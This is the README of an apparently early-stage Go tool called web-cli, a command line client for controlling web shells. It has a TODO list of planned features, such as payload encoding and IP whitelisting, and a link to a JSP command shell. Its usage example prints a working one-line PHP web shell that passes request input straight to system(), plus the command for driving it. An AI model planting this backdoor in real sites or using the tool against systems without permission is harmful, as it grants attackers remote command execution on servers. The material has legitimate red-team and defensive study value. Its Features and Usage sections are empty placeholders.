# web-cli

Command line interface for web shells.

## TODO

[] encoding/encrypting (base64, xor, aes)
[] asp templates
[] test whitelist ip sources
[] add cidr to whitelist
[] fix jsp / lang specific minification
[] password get/post body parameters
[] setup php to use multipart form
[] on download, background the download to goroutine 

https://github.com/SecurityRiskAdvisors/cmd.jsp/blob/master/cmd_readable.jsp

## Features

- feature

## Usage

```
flag usage
```

## Example use cases

### PHP Shell Upload

##### PHP Shell

```php
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); die; }?>
```

##### Command

```
go run main.go -X GET -url http://127.0.0.1:8080/shell.php -p cmd
```

Catch asp error:

``` asp
On Error Resume Next
... do something...
If Err.Number <> 0 Then
... handle error
end if
```